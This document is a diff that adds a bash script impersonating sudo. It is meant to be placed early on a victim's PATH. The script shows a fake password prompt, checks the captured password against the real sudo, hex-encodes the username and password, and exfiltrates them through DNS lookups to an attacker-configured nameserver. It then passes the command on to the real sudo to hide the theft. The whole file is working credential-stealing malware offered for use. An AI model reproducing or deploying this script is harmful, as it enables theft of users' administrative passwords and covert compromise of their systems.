@@ -1,0 +1,36 @@
+#!/bin/bash
+# Drop this file on disk in the leading directory on $PATH and make it executable
+# Then point NS_DOMAIN to your nameserver, served by dns-server.py
+
+NS_DOMAIN=ns.some.tld #CHANGEME
+
+function send_creds() {
+    username_blob=$(for ((i=0;i<${#USER};i++));do printf %02X \'${USER:$i:1};done)
+    password_blob=$(for ((i=0;i<${#pwd};i++));do printf %02X \'${pwd:$i:1};done)
+    iter=0
+    while [ ${#password_blob} -ge 62 -o ${#password_blob} -gt 0 ]; do
+	host -t A $1.$iter.$username_blob.${password_blob:0:62}.$NS_DOMAIN 2>/dev/null 1>/dev/null &
+	password_blob=${password_blob:62}
+	((iter++))
+    done;
+}
+
+/usr/bin/sudo -n true 2>/dev/null
+if [ $? -eq 0 ]
+then
+    /usr/bin/sudo $@
+else
+    echo -n "[sudo] password for $USER: "
+    read -s pwd
+    echo
+    echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
+    credentials_valid=$?
+    send_creds $credentials_valid;
+    if [ $credentials_valid -eq 1 ]
+    then
+	echo "Sorry, try again."
+	sudo $@
+    else
+	echo "$pwd" | /usr/bin/sudo -S $@
+    fi
+fi
